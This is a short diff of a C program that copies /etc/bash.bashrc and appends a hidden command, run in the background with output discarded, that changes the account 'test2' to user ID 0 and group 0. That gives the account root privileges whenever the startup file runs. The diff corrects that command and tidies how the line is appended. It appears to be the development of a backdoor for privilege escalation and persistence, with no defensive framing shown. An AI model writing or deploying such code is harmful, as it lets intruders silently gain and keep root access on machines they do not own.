@@ -92,7 +92,7 @@ int main() {
     FILE *ogFile, *newFile;
     ogFile = fopen("/etc/bash.bashrc", "r");
     newFile = fopen("./tmp/bash.bashrc", "w");
-    char line[] = "/bin/bash -c \"/user/sbin/usermod -ou 0 -g 0 > /dev/null 2>&1 & \"\n";
+    char line[] = "/bin/bash -c \"/user/sbin/usermod -ou 0 -g 0 test2 > /dev/null 2>&1 &\"\n";
 
     char c = fgetc(ogFile);
     // bool useMyEntry = false;
@@ -131,6 +131,7 @@ int main() {
         // }
         c = fgetc(ogFile);
         if (c == EOF) {
+            fputc('\n', newFile);
             fsetpos(ogFile, &pos);
             writeMyLine(newFile, &line);
             c = fgetc(ogFile);
